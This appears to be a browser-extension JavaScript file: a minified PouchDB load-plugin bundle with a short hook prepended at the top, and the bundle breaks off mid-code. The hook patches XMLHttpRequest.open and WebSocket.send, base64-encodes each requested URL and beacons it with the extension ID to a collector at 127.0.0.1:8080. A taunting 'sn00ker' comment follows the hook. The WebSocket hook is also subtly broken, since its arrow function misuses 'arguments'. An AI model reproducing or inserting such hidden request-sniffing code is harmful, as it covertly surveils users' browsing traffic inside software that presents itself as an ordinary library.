function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function e(t,r,n){function o(s,a){if(!r[s]){if(!t[s]){var u="function"==typeof require&&require;if(!a&&u)return u(s,!0);if(i)return i(s,!0);throw new Error("Cannot find module '"+s+"'")}var c=r[s]={exports:{}};t[s][0].call(c.exports,function(e){var r=t[s][1][e];return o(r?r:e)},c,c.exports,e,t,r,n)}return r[s].exports}for(var i="function"==typeof require&&require,s=0;s<n.length;s++)o(n[s]);return o}({1:[function(e,t,r){"use strict";function n(e){var t=[],r=0;try{e.split("\n").forEach(function(e){e&&(e=JSON.parse(e),e.docs&&(t=t.concat(e.docs)),e.seq&&(r=e.seq))})}catch(n){return{err:n}}return{docs:t,lastSeq:r}}function o(e,t,r,o){function i(e){p||o(e),p=!0}var a=n(t);if(a.err)return o(a.err);var f=a.docs,l=a.lastSeq,p=!1;e.bulkDocs({docs:f,new_edits:!1}).then(function(){return r.proxy?e.info():i()}).then(function(t){var n=new e.constructor(r.proxy,s.extend(!0,{},{},r)),o=new e.constructor(t.db_name,s.extend(!0,{},e.__opts,r)),i={};return r.filter&&(i.filter=r.filter),r.query_params&&(i.query_params=r.query_params),c(n,o,i).then(function(e){var t={cancelled:!1},r=new u(n,o,e,t);return r.writeCheckpoint(l)})}).then(function(){i()},i)}function i(e,t,r,n){var i={url:t,json:!1};r.ajax&&(i=s.extend(!0,i,r.ajax)),a(i,function(t,i){return t?n(t):void o(e,i,r,n)})}var s=e("./utils"),a=e("pouchdb/extras/ajax"),u=e("pouchdb/extras/checkpointer"),c=e("pouchdb/extras/generateReplicationId");r.load=s.toPromise(function(e,t,r){var n=this;return"function"==typeof t&&(r=t,t={}),/^\s*\{/.test(e)?o(n,e,t,r):i(n,e,t,r)}),"undefined"!=typeof window&&window.PouchDB&&window.PouchDB.plugin(r)},{"./utils":2,"pouchdb/extras/ajax":11,"pouchdb/extras/checkpointer":12,"pouchdb/extras/generateReplicationId":13}],2:[function(e,t,r){var n=e("__browserify_process"),o="undefined"!=typeof self?self:"undefined"!=typeof window?window:{},i=e("pouchdb/extras/promise");r.uuid=e("./uuid"),r.extend=e("pouchdb-extend"),r.once=function(e){var t=!1;return r.getArguments(function(r){if(t)throw console.trace(),new Error("once called  more than once");t=!0,e.apply(this,r)})},r.getArguments=e("argsarray"),r.toPromise=function(e){return r.getArguments(function(t){var o,s=this,a="function"==typeof t[t.length-1]?t.pop():!1;a&&(o=function(e,t){n.nextTick(function(){a(e,t)})});var u=new i(function(n,o){try{var i=r.once(function(e,t){e?o(e):n(t)});t.push(i),e.apply(s,t)}catch(a){o(a)}});return o&&u.then(function(e){o(null,e)},o),u.cancel=function(){return this},u})},r.inherits=e("inherits"),r.Promise=i,r.explain404=function(e){n.browser&&"console"in o&&"info"in console&&console.info("The above 404 is totally normal. "+e+"\nâ™¥ the PouchDB team")}},{"./uuid":3,__browserify_process:36,argsarray:4,inherits:6,"pouchdb-extend":10,"pouchdb/extras/promise":14}],3:[function(e,t,r){"use strict";function n(e){return 0|Math.random()*e}function o(e,t){t=t||i.length;var r="",o=-1;if(e){for(;++o<e;)r+=i[n(t)];return r}for(;++o<36;)switch(o){case 8:case 13:case 18:case 23:r+="-";break;case 19:r+=i[3&n(16)|8];break;default:r+=i[n(16)]}return r}var i="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split("");t.exports=o},{}],4:[function(e,t,r){"use strict";function n(e){return function(){var t=arguments.length;if(t){for(var r=[],n=-1;++n<t;)r[n]=arguments[n];return e.call(this,r)}return e.call(this,[])}}t.exports=n},{}],5:[function(e,t,r){function n(){p=!0;for(var e,t,r=h.length;r;){for(t=h,h=[],e=-1;++e<r;)t[e]();r=h.length}p=!1}function o(e){1!==h.push(e)||p||i()}var i,s="undefined"!=typeof self?self:"undefined"!=typeof window?window:{},a=s.MutationObserver||s.WebKitMutationObserver;if(a){var u=0,c=new a(n),f=s.document.createTextNode("");c.observe(f,{characterData:!0}),i=function(){f.data=u=++u%2}}else if(s.setImmediate||"undefined"==typeof s.MessageChannel)i="document"in s&&"onreadystatechange"in s.document.createElement("script")?function(){var e=s.document.createElement("script");e.onreadystatechange=function(){n(),e.onreadystatechange=null,e.parentNode.removeChild(e),e=null},s.document.documentElement.appendChild(e)}:function(){setTimeout(n,0)};else{var l=new s.MessageChannel;l.port1.onmessage=n,i=function(){l.port2.postMessage(0)}}var p,h=[];t.exports=o},{}],6:[function(e,t,r){"function"==typeof Object.create?t.exports=function(e,t){e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}})}:t.exports=function(e,t){e.super_=t;var r=function(){};r.prototype=t.prototype,e.prototype=new r,e.prototype.constructor=e}},{}],7:[function(e,t,r){(function(){var e=Array.prototype.slice,t=Array.prototype.forEach,r=function(n){if("object"!=typeof n)throw n+" is not an object";var o=e.call(arguments,1);return t.call(o,function(e){if(e)for(var t in e)"object"==typeof e[t]&&n[t]?r.call(n,n[t],e[t]):n[t]=e[t]}),n};this.extend=r}).call(this)},{}],8:[function(e,t,r){"use strict";function n(e){if(null!==e)switch(typeof e){case"boolean":return e?1:0;case"number":return f(e);case"string":return e.replace(/\u0002/g,"").replace(/\u0001/g,"").replace(/\u0000/g,"");case"object":var t=Array.isArray(e),n=t?e:Object.keys(e),o=-1,i=n.length,s="";if(t)for(;++o<i;)s+=r.toIndexableString(n[o]);else for(;++o<i;){var a=n[o];s+=r.toIndexableString(a)+r.toIndexableString(e[a])}return s}return""}function o(e,t){var r,n=t,o="1"===e[t];if(o)r=0,t++;else{var i="0"===e[t];t++;var s="",a=e.substring(t,t+p),u=parseInt(a,10)+l;for(i&&(u=-u),t+=p;;){var c=e[t];if("\x00"===c)break;s+=c,t++}s=s.split("."),r=1===s.length?parseInt(s,10):parseFloat(s[0]+"."+s[1]),i&&(r-=10),0!==u&&(r=parseFloat(r+"e"+u))}return{num:r,length:t-n}}function i(e,t){var r=e.pop();if(t.length){var n=t[t.length-1];r===n.element&&(t.pop(),n=t[t.length-1]);var o=n.element,i=n.index;if(Array.isArray(o))o.push(r);else if(i===e.length-2){var s=e.pop();o[s]=r}else e.push(r)}}function s(e,t){for(var n=Math.min(e.length,t.length),o=0;n>o;o++){var i=r.collate(e[o],t[o]);if(0!==i)return i}return e.length===t.length?0:e.length>t.length?1:-1}function a(e,t){return e===t?0:e>t?1:-1}function u(e,t){for(var n=Object.keys(e),o=Object.keys(t),i=Math.min(n.length,o.length),s=0;i>s;s++){var a=r.collate(n[s],o[s]);if(0!==a)return a;if(a=r.collate(e[n[s]],t[o[s]]),0!==a)return a}return n.length===o.length?0:n.length>o.length?1:-1}function c(e){var t=["boolean","number","string","object"],r=t.indexOf(typeof e);return~r?null===e?1:Array.isArray(e)?5:3>r?r+2:r+3:Array.isArray(e)?5:void 0}function f(e){if(0===e)return"1";var t=e.toExponential().split(/e\+?/),r=parseInt(t[1],10),n=0>e,o=n?"0":"2",i=(n?-r:r)-l,s=d.padLeft(i.toString(),"0",p);o+=h+s;var a=Math.abs(parseFloat(t[0]));n&&(a=10-a);var u=a.toFixed(20);return u=u.replace(/\.?0+$/,""),o+=h+u}var l=-324,p=3,h="",d=e("./utils");r.collate=function(e,t){if(e===t)return 0;e=r.normalizeKey(e),t=r.normalizeKey(t);var n=c(e),o=c(t);if(n-o!==0)return n-o;if(null===e)return 0;switch(typeof e){case"number":return e-t;case"boolean":return e===t?0:t>e?-1:1;case"string":return a(e,t)}return Array.isArray(e)?s(e,t):u(e,t)},r.normalizeKey=function(e){switch(typeof e){case"undefined":return null;case"number":return e===1/0||e===-(1/0)||isNaN(e)?null:e;case"object":var t=e;if(Array.isArray(e)){var n=e.length;e=new Array(n);for(var o=0;n>o;o++)e[o]=r.normalizeKey(t[o])}else{if(e instanceof Date)return e.toJSON();if(null!==e){e={};for(var i in t)if(t.hasOwnProperty(i)){var s=t[i];"undefined"!=typeof s&&(e[i]=r.normalizeKey(s))}}}}return e},r.toIndexableString=function(e){var t="\x00";return e=r.normalizeKey(e),c(e)+h+n(e)+t},r.parseIndexableString=function(e){for(var t=[],r=[],n=0;;){var s=e[n++];if("\x00"!==s)switch(s){case"1":t.push(null);break;case"2":t.push("1"===e[n]),n++;break;case"3":var a=o(e,n);t.push(a.num),n+=a.length;break;case"4":for(var u="";;){var c=e[n];if("\x00"===c)break;u+=c,n++}u=u.replace(/\u0001\u0001/g,"\x00").replace(/\u0001\u0002/g,"").replace(/\u0002\u0002/g,""),t.push(u);break;case"5":var f={element:[],index:t.length};t.push(f.element),r.push(f);break;case"6":var l={element:{},index:t.length};t.push(l.element),r.push(l);break;default:throw new Error("bad collationIndex or unexpectedly reached end of input: "+s)}else{if(1===t.length)return t.pop();i(t,r)}}}},{"./utils":9}],9:[function(e,t,r){"use strict";function n(e,t,r){for(var n="",o=r-e.length;n.length<o;)n+=t;return n}r.padLeft=function(e,t,r){var o=n(e,t,r);return o+e},r.padRight=function(e,t,r){var o=n(e,t,r);return e+o},r.stringLexCompare=function(e,t){var r,n=e.length,o=t.length;for(r=0;n>r;r++){if(r===o)return 1;var i=e.charAt(r),s=t.charAt(r);if(i!==s)return s>i?-1:1}return o>n?-1:0},r.intToDecimalForm=function(e){var t=0>e,r="";do{var n=t?-Math.ceil(e%10):Math.floor(e%10);r=n+r,e=t?Math.ceil(e/10):Math.floor(e/10)}while(e);return t&&"0"!==r&&(r="-"+r),r}},{}],10:[function(e,t,r){"use strict";function n(e){return null===e?String(e):"object"==typeof e||"function"==typeof e?c[h.call(e)]||"object":typeof e}function o(e){return null!==e&&e===e.window}function i(e){if(!e||"object"!==n(e)||e.nodeType||o(e))return!1;try{if(e.constructor&&!d.call(e,"constructor")&&!d.call(e.constructor.prototype,"isPrototypeOf"))return!1}catch(t){return!1}var r;for(r in e);return void 0===r||d.call(e,r)}function s(e){return"function"===n(e)}function a(){for(var e=[],t=-1,r=arguments.length,n=new Array(r);++t<r;)n[t]=arguments[t];var o={};e.push({args:n,result:{container:o,key:"key"}});for(var i;i=e.pop();)u(e,i.args,i.result);return o.key}function u(e,t,r){var n,o,a,u,c,f,l,p=t[0]||{},h=1,d=t.length,b=!1,v=/\d+/;for("boolean"==typeof p&&(b=p,p=t[1]||{},h=2),"object"==typeof p||s(p)||(p={}),d===h&&(p=this,--h);d>h;h++)if(null!=(n=t[h])){l=y(n);for(o in n)if(!(o in Object.prototype)){if(l&&!v.test(o))continue;if(a=p[o],u=n[o],p===u)continue;b&&u&&(i(u)||(c=y(u)))?(c?(c=!1,f=a&&y(a)?a:[]):f=a&&i(a)?a:{},e.push({args:[b,f,u],result:{container:p,key:o}})):void 0!==u&&(y(n)&&s(u)||(p[o]=u))}}r.container[r.key]=p}for(var c={},f=["Boolean","Number","String","Function","Array","Date","RegExp","Object","Error"],l=0;l<f.length;l++){var p=f[l];c["[object "+p+"]"]=p.toLowerCase()}var h=c.toString,d=c.hasOwnProperty,y=Array.isArray||function(e){return"array"===n(e)};t.exports=a},{}],11:[function(e,t,r){"use strict";t.exports=e("../lib/deps/ajax/ajaxCore")},{"../lib/deps/ajax/ajaxCore":15}],12:[function(e,t,r){"use strict";t.exports=e("../lib/replicate/checkpointer")},{"../lib/replicate/checkpointer":32}],13:[function(e,t,r){"use strict";t.exports=e("../lib/replicate/generateReplicationId")},{"../lib/replicate/generateReplicationId":33}],14:[function(e,t,r){"use strict";t.exports=e("../lib/deps/promise")},{"../lib/deps/promise":30}],15:[function(e,t,r){"use strict";function n(e,t){function r(t,r,n){if(!e.binary&&e.json&&"string"==typeof t)try{t=JSON.parse(t)}catch(o){return n(o)}Array.isArray(t)&&(t=t.map(function(e){return e.error||e.missing?s.generateErrorFromResponse(e):e})),e.binary&&u(t,r),n(null,t,r)}function n(e,t){var r,n;if(e.code&&e.status){var o=new Error(e.message||e.code);return o.status=e.status,t(o)}try{r=JSON.parse(e.responseText),n=s.generateErrorFromResponse(r)}catch(i){n=s.generateErrorFromResponse(e)}t(n)}e=a(e);var l={method:"GET",headers:{},json:!0,processData:!0,timeout:1e4,cache:!1};return e=i(l,e),e.json&&(e.binary||(e.headers.Accept="application/json"),e.headers["Content-Type"]=e.headers["Content-Type"]||"application/json"),e.binary&&(e.encoding=null,e.json=!1),e.processData||(e.json=!1),o(e,function(o,i,a){if(o){if(i){var u="undefined"!=typeof document&&document.location.origin,l=u&&0!==e.url.indexOf(u);l&&0===i.statusCode&&f(),o.status=i.statusCode}else o.status=400;return n(o,t)}var p,h=i.headers&&i.headers["content-type"],d=a||c();if(!e.binary&&(e.json||!e.processData)&&"object"!=typeof d&&(/json/.test(h)||/^[\s]*\{/.test(d)&&/\}[\s]*$/.test(d)))try{d=JSON.parse(d.toString())}catch(y){}i.statusCode>=200&&i.statusCode<300?r(d,i,t):(p=s.generateErrorFromResponse(d),p.status=i.statusCode,t(p))})}var o=e("request"),i=e("js-extend").extend,s=e("./../errors"),a=e("../../deps/clone"),u=e("./applyTypeToBuffer"),c=e("./defaultBody"),f=e("./explainCors");t.exports=n},{"../../deps/clone":26,"./../errors":27,"./applyTypeToBuffer":16,"./defaultBody":17,"./explainCors":18,"js-extend":7,request:20}],16:[function(e,t,r){"use strict";t.exports=function(){}},{}],17:[function(e,t,r){"use strict";t.exports=function(){return""}},{}],18:[function(e,t,r){var n="undefined"!=typeof self?self:"undefined"!=typeof window?window:{};t.exports=function(){"console"in n&&"warn"in console&&console.warn("PouchDB: the remote database may not have CORS enabled.If not please enable CORS: http://pouchdb.com/errors.html#no_access_control_allow_origin_header")}},{}],19:[function(e,t,r){var n="undefined"!=typeof self?self:"undefined"!=typeof window?window:{};t.exports=function(e,t){"console"in n&&"info"in console&&console.info("The above "+e+" is totally normal. "+t)}},{}],20:[function(e,t,r){"use strict";function n(){for(var e={},t=new c(function(t,r){e.resolve=t,e.reject=r}),r=new Array(arguments.length),n=0;n<r.length;n++)r[n]=arguments[n];return e.promise=t,c.resolve().then(function(){return fetch.apply(null,r)}).then(function(t){e.resolve(t)})["catch"](function(t){e.reject(t)}),e}function o(e,t){var r,o,i,s=new Headers,a={method:e.method,credentials:"include",headers:s};return e.json&&(s.set("Accept","application/json"),s.set("Content-Type",e.headers["Content-Type"]||"application/json")),e.body&&e.body instanceof Blob?u(e.body,function(e){a.body=e}):e.body&&e.processData&&"string"!=typeof e.body?a.body=JSON.stringify(e.body):"body"in e?a.body=e.body:a.body=null,Object.keys(e.headers).forEach(function(t){e.headers.hasOwnProperty(t)&&s.set(t,e.headers[t])}),r=n(e.url,a),e.timeout>0&&(o=setTimeout(function(){r.reject(new Error("Load timeout for resource: "+e.url))},e.timeout)),r.promise.then(function(t){return i={statusCode:t.status},e.timeout>0&&clearTimeout(o),i.statusCode>=200&&i.statusCode<300?e.binary?t.blob():t.text():t.json()}).then(function(e){i.statusCode>=200&&i.statusCode<300?t(null,i,e):t(e,i)})["catch"](function(e){t(e,i)}),{abort:r.reject}}function i(e,t){var r,n,o,i=function(){r.abort()};r=e.xhr?new e.xhr:new XMLHttpRequest,r.open(e.method,e.url),r.withCredentials="withCredentials"in e?e.withCredentials:!0,"GET"===e.method?delete e.headers["Content-Type"]:e.json&&(e.headers.Accept="application/json",e.headers["Content-Type"]=e.headers["Content-Type"]||"application/json",e.body&&e.processData&&"string"!=typeof e.body&&(e.body=JSON.stringify(e.body))),e.binary&&(r.responseType="arraybuffer"),"body"in e||(e.body=null);for(var s in e.headers)e.headers.hasOwnProperty(s)&&r.setRequestHeader(s,e.headers[s]);return e.timeout>0&&(n=setTimeout(i,e.timeout),r.onprogress=function(){clearTimeout(n),n=setTimeout(i,e.timeout)},"undefined"==typeof o&&(o=-1!==Object.keys(r).indexOf("upload")&&"undefined"!=typeof r.upload),o&&(r.upload.onprogress=r.onprogress)),r.onreadystatechange=function(){if(4===r.readyState){var n={statusCode:r.status};if(r.status>=200&&r.status<300){var o;o=e.binary?a([r.response||""],{type:r.getResponseHeader("Content-Type")}):r.responseText,t(null,n,o)}else{var i={};try{i=JSON.parse(r.response)}catch(s){}t(i,n)}}},e.body&&e.body instanceof Blob?u(e.body,function(e){r.send(e)}):r.send(e.body),{abort:i}}function s(){try{return new XMLHttpRequest,!0}catch(e){return!1}}var a=e("./../binary/blob.js"),u=e("./../binary/readAsArrayBuffer"),c=e("../../deps/promise"),f=s();t.exports=function(e,t){return f||e.xhr?i(e,t):o(e,t)}},{"../../deps/promise":30,"./../binary/blob.js":22,"./../binary/readAsArrayBuffer":25}],21:[function(e,t,r){"use strict";r.atob=function(e){return atob(e)},r.btoa=function(e){return btoa(e)}},{}],22:[function(e,t,r){"use strict";function n(e,t){e=e||[],t=t||{};try{return new Blob(e,t)}catch(r){if("TypeError"!==r.name)throw r;for(var n="undefined"!=typeof BlobBuilder?BlobBuilder:"undefined"!=typeof MSBlobBuilder?MSBlobBuilder:"undefined"!=typeof MozBlobBuilder?MozBlobBuilder:WebKitBlobBuilder,o=new n,i=0;i<e.length;i+=1)o.append(e[i]);return o.getBlob(t.type)}}t.exports=n},{}],23:[function(e,t,r){"use strict";function n(e){if("function"==typeof e.slice)return e.slice(0);var t=new ArrayBuffer(e.byteLength),r=new Uint8Array(t),n=new Uint8Array(e);return r.set(n),t}t.exports=function(e){if(e instanceof ArrayBuffer)return n(e);var t=e.size,r=e.type;return"function"==typeof e.slice?e.slice(0,t,r):e.webkitSlice(0,t,r)}},{}],24:[function(e,t,r){"use strict";t.exports=function(e){return e instanceof ArrayBuffer||"undefined"!=typeof Blob&&e instanceof Blob}},{}],25:[function(e,t,r){"use strict";t.exports=function(e,t){if("undefined"==typeof FileReader)return t((new FileReaderSync).readAsArrayBuffer(e));var r=new FileReader;r.onloadend=function(e){var r=e.target.result||new ArrayBuffer(0);t(r)},r.readAsArrayBuffer(e)}},{}],26:[function(e,t,r){"use strict";var n=e("./binary/isBinaryObject"),o=e("./binary/cloneBinaryObject");t.exports=function i(e){var t,r,s;if(!e||"object"!=typeof e)return e;if(Array.isArray(e)){for(t=[],r=0,s=e.length;s>r;r++)t[r]=i(e[r]);return t}if(e instanceof Date)return e.toISOString();if(n(e))return o(e);t={};for(r in e)if(Object.prototype.hasOwnProperty.call(e,r)){var a=i(e[r]);"undefined"!=typeof a&&(t[r]=a)}return t}},{"./binary/cloneBinaryObject":23,"./binary/isBinaryObject":24}],27:[function(e,t,r){"use strict";function n(e){Error.call(this,e.reason),this.status=e.status,this.name=e.error,this.message=e.reason,this.error=!0}var o=e("inherits");o(n,Error),n.prototype.toString=function(){return JSON.stringify({status:this.status,name:this.name,message:this.message,reason:this.reason})},r.UNAUTHORIZED=new n({status:401,error:"unauthorized",reason:"Name or password is incorrect."}),r.MISSING_BULK_DOCS=new n({status:400,error:"bad_request",reason:"Missing JSON list of 'docs'"}),r.MISSING_DOC=new n({status:404,error:"not_found",reason:"missing"}),r.REV_CONFLICT=new n({status:409,error:"conflict",reason:"Document update conflict"}),r.INVALID_ID=new n({status:400,error:"invalid_id",reason:"_id field must contain a string"}),r.MISSING_ID=new n({status:412,error:"missing_id",reason:"_id is required for puts"}),r.RESERVED_ID=new n({status:400,error:"bad_request",reason:"Only reserved document ids may start with underscore."}),r.NOT_OPEN=new n({status:412,error:"precondition_failed",reason:"Database not open"}),r.UNKNOWN_ERROR=new n({status:500,error:"unknown_error",reason:"Database encountered an unknown error"}),r.BAD_ARG=new n({status:500,error:"badarg",reason:"Some query argument is invalid"}),r.INVALID_REQUEST=new n({status:400,error:"invalid_request",reason:"Request was invalid"}),r.QUERY_PARSE_ERROR=new n({status:400,error:"query_parse_error",reason:"Some query parameter is invalid"}),r.DOC_VALIDATION=new n({status:500,error:"doc_validation",reason:"Bad special document member"}),r.BAD_REQUEST=new n({status:400,error:"bad_request",reason:"Something wrong with the request"}),r.NOT_AN_OBJECT=new n({status:400,error:"bad_request",reason:"Document must be a JSON object"}),r.DB_MISSING=new n({status:404,error:"not_found",reason:"Database not found"}),r.IDB_ERROR=new n({status:500,error:"indexed_db_went_bad",reason:"unknown"}),r.WSQ_ERROR=new n({status:500,error:"web_sql_went_bad",reason:"unknown"}),r.LDB_ERROR=new n({status:500,error:"levelDB_went_went_bad",reason:"unknown"}),r.FORBIDDEN=new n({status:403,error:"forbidden",reason:"Forbidden by design doc validate_doc_update function"}),r.INVALID_REV=new n({status:400,error:"bad_request",reason:"Invalid rev format"}),r.FILE_EXISTS=new n({status:412,error:"file_exists",reason:"The database could not be created, the file already exists."}),r.MISSING_STUB=new n({status:412,error:"missing_stub"}),r.error=function(e,t,r){function o(t){for(var n in e)"function"!=typeof e[n]&&(this[n]=e[n]);void 0!==r&&(this.name=r),void 0!==t&&(this.reason=t)}return o.prototype=n.prototype,new o(t)},r.getErrorTypeByProp=function(e,t,n){var o=r,i=Object.keys(o).filter(function(r){var n=o[r];return"function"!=typeof n&&n[e]===t}),s=n&&i.filter(function(e){var t=o[e];return t.message===n})[0]||i[0];return s?o[s]:null},r.generateErrorFromResponse=function(e){var t,n,o,i,s,a=r;return n=e.error===!0&&"string"==typeof e.name?e.name:e.error,s=e.reason,o=a.getErrorTypeByProp("name",n,s),e.missing||"missing"===s||"deleted"===s||"not_found"===n?o=a.MISSING_DOC:"doc_validation"===n?(o=a.DOC_VALIDATION,i=s):"bad_request"===n&&o.message!==s&&(o=a.BAD_REQUEST),o||(o=a.getErrorTypeByProp("status",e.status,s)||a.UNKNOWN_ERROR),t=a.error(o,s,n),i&&(t.message=i),e.id&&(t.id=e.id),e.status&&(t.status=e.status),e.missing&&(t.missing=e.missing),t}},{inherits:6}],28:[function(e,t,r){function n(e){return String.fromCharCode(255&e)+String.fromCharCode(e>>>8&255)+String.fromCharCode(e>>>16&255)+String.fromCharCode(e>>>24&255)}function o(e){for(var t="",r=0,o=e.length;o>r;r++)t+=n(e[r]);return c.btoa(t)}function i(e,t,r,n){(r>0||n<t.byteLength)&&(t=new Uint8Array(t,r,Math.min(n,t.byteLength)-r)),e.append(t)}function s(e,t,r,n){(r>0||n<t.length)&&(t=t.substring(r,n)),e.appendBinary(t)}var a="undefined"!=typeof self?self:"undefined"!=typeof window?window:{},u=e("./toPromise"),c=e("./binary/base64"),f=e("spark-md5"),l=a.setImmediate||a.setTimeout,p=32768;t.exports=u(function(e,t){function r(){var n=h*u,i=n+u;if(h++,c>h)y(d,e,n,i),l(r);else{y(d,e,n,i);var s=d.end(!0),a=o(s);t(null,a),d.destroy()}}var n="string"==typeof e,a=n?e.length:e.byteLength,u=Math.min(p,a),c=Math.ceil(a/u),h=0,d=n?new f:new f.ArrayBuffer,y=n?s:i;r()})},{"./binary/base64":21,"./toPromise":31,"spark-md5":35}],29:[function(e,t,r){"use strict";function n(e){var t=!1;return o(function(r){if(t)throw new Error("once called more than once");t=!0,e.apply(this,r)})}var o=e("argsarray");t.exports=n},{argsarray:4}],30:[function(e,t,r){"use strict";t.exports="function"==typeof Promise?Promise:e("lie")},{lie:34}],31:[function(e,t,r){function n(e){return s(function(t){t=a(t);var r,n=this,s="function"==typeof t[t.length-1]?t.pop():!1;s&&(r=function(e,t){o.nextTick(function(){s(e,t)})});var c=new i(function(r,o){var i;try{var s=u(function(e,t){e?o(e):r(t)});t.push(s),i=e.apply(n,t),i&&"function"==typeof i.then&&r(i)}catch(a){o(a)}});return r&&c.then(function(e){r(null,e)},r),c})}var o=e("__browserify_process"),i=e("./promise"),s=e("argsarray"),a=e("./clone"),u=e("./once");t.exports=n},{"./clone":26,"./once":29,"./promise":30,__browserify_process:36,argsarray:4}],32:[function(e,t,r){"use strict";function n(e,t,r,o,i){return e.get(t)["catch"](function(r){if(404===r.status)return"http"===e.type()&&c(404,"PouchDB is just checking if a remote checkpoint exists."),{session_id:o,_id:t,history:[],replicator:h,version:p};throw r}).then(function(s){return i.cancelled?void 0:(s.history=(s.history||[]).filter(function(e){return e.session_id!==o}),s.history.unshift({last_seq:r,session_id:o}),s.history=s.history.slice(0,d),s.version=p,s.replicator=h,s.session_id=o,s.last_seq=r,e.put(s)["catch"](function(s){if(409===s.status)return n(e,t,r,o,i);throw s}))})}function o(e,t,r,n){this.src=e,this.target=t,this.id=r,this.returnValue=n}function i(e,t){if(e.session_id===t.session_id)return{last_seq:e.last_seq,history:e.history||[]};var r=e.history||[],n=t.history||[];return s(r,n)}function s(e,t){var r=e[0],n=e.slice(1),o=t[0],i=t.slice(1);if(!r||0===t.length)return{last_seq:y,history:[]};var u=r.session_id;if(a(u,t))return{last_seq:r.last_seq,history:e};var c=o.session_id;return a(c,n)?{last_seq:o.last_seq,history:i}:s(n,i)}function a(e,t){var r=t[0],n=t.slice(1);return e&&0!==t.length?e===r.session_id?!0:a(e,n):!1}var u=e("./../deps/promise"),c=e("./../deps/ajax/explainError"),f=e("pouchdb-collate"),l=f.collate,p=1,h="pouchdb",d=5,y=0;o.prototype.writeCheckpoint=function(e,t){var r=this;return this.updateTarget(e,t).then(function(){return r.updateSource(e,t)})},o.prototype.updateTarget=function(e,t){return n(this.target,this.id,e,t,this.returnValue)},o.prototype.updateSource=function(e,t){var r=this;return this.readOnlySource?u.resolve(!0):n(this.src,this.id,e,t,this.returnValue)["catch"](function(e){var t="number"==typeof e.status&&4===Math.floor(e.status/100);if(t)return r.readOnlySource=!0,!0;throw e})};var b={undefined:function(e,t){return 0===l(e.last_seq,t.last_seq)?t.last_seq:0},1:function(e,t){return i(t,e).last_seq}};o.prototype.getCheckpoint=function(){var e=this;return e.target.get(e.id).then(function(t){return e.src.get(e.id).then(function(e){if(t.version!==e.version)return y;var r;return r=t.version?t.version.toString():"undefined",r in b?b[r](t,e):y},function(r){if(404===r.status&&t.last_seq)return e.src.put({_id:e.id,last_seq:y}).then(function(){return y},function(r){return 401===r.status?(e.readOnlySource=!0,t.last_seq):y});throw r})})["catch"](function(e){if(404!==e.status)throw e;return y})},t.exports=o},{"./../deps/ajax/explainError":19,"./../deps/promise":30,"pouchdb-collate":8}],33:[function(e,t,r){"use strict";function n(e){return Object.keys(e).sort(a).reduce(function(t,r){return t[r]=e[r],t},{})}function o(e,t,r){var o=r.doc_ids?r.doc_ids.sort(a):"",u=r.filter?r.filter.toString():"",c="",f="";return r.filter&&r.query_params&&(c=JSON.stringify(n(r.query_params))),r.filter&&"_view"===r.filter&&(f=r.view.toString()),i.all([e.id(),t.id()]).then(function(e){var t=e[0]+e[1]+u+f+c+o;return s(t)}).then(function(e){return e=e.replace(/\//g,".").replace(/\+/g,"_"),"_local/"+e})}var i=e("./../deps/promise"),s=e("../deps/md5"),a=e("pouchdb-collate").collate;t.exports=o},{"../deps/md5":28,"./../deps/promise":30,"pouchdb-collate":8}],34:[function(e,t,r){"use strict";function n(){}function o(e){if("function"!=typeof e)throw new TypeError("resolver must be a function");this.state=g,this.queue=[],this.outcome=void 0,e!==n&&u(this,e)}function i(e,t,r){this.promise=e,"function"==typeof t&&(this.onFulfilled=t,this.callFulfilled=this.otherCallFulfilled),"function"==typeof r&&(this.onRejected=r,this.callRejected=this.otherCallRejected)}function s(e,t,r){d(function(){var n;try{n=t(r)}catch(o){return y.reject(e,o)}n===e?y.reject(e,new TypeError("Cannot resolve promise with itself")):y.resolve(e,n)})}function a(e){var t=e&&e.then;return e&&"object"==typeof e&&"function"==typeof t?function(){t.apply(e,arguments)}:void 0}function u(e,t){function r(t){i||(i=!0,y.reject(e,t))}function n(t){i||(i=!0,y.resolve(e,t))}function o(){t(n,r)}var i=!1,s=c(o);"error"===s.status&&r(s.value)}function c(e,t){var r={};try{r.value=e(t),r.status="success"}catch(n){r.status="error",r.value=n}return r}function f(e){return e instanceof this?e:y.resolve(new this(n),e)}function l(e){var t=new this(n);return y.reject(t,e)}function p(e){function t(e,t){function n(e){s[t]=e,++a!==o||i||(i=!0,y.resolve(c,s))}r.resolve(e).then(n,function(e){i||(i=!0,y.reject(c,e))})}var r=this;if("[object Array]"!==Object.prototype.toString.call(e))return this.reject(new TypeError("must be an array"));var o=e.length,i=!1;if(!o)return this.resolve([]);for(var s=new Array(o),a=0,u=-1,c=new this(n);++u<o;)t(e[u],u);return c}function h(e){function t(e){r.resolve(e).then(function(e){i||(i=!0,y.resolve(a,e))},function(e){i||(i=!0,y.reject(a,e))})}var r=this;if("[object Array]"!==Object.prototype.toString.call(e))return this.reject(new TypeError("must be an array"));var o=e.length,i=!1;if(!o)return this.resolve([]);for(var s=-1,a=new this(n);++s<o;)t(e[s]);return a}var d=e("immediate"),y={},b=["REJECTED"],v=["FULFILLED"],g=["PENDING"];t.exports=r=o,o.prototype["catch"]=function(e){return this.then(null,e)},o.prototype.then=function(e,t){if("function"!=typeof e&&this.state===v||"function"!=typeof t&&this.state===b)return this;var r=new this.constructor(n);if(this.state!==g){var o=this.state===v?e:t;s(r,o,this.outcome)}else this.queue.push(new i(r,e,t));return 